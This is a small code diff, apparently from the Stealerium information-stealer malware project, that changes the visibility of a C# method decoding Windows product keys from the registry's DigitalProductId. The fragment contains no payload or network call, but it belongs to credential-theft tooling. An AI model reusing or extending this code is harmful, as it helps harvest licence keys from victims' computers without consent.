@@ -14,7 +14,7 @@ namespace Stealerium.Target.System
         /// </summary>
         /// <param name="digitalProductId">DigitalProductId to decode</param>
         /// <returns>Decoded Windows Product Key as a string</returns>
-        public static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
+        private static string DecodeProductKeyWin8AndUp(byte[] digitalProductId)
         {
             var key = string.Empty;
             const int keyOffset = 52;
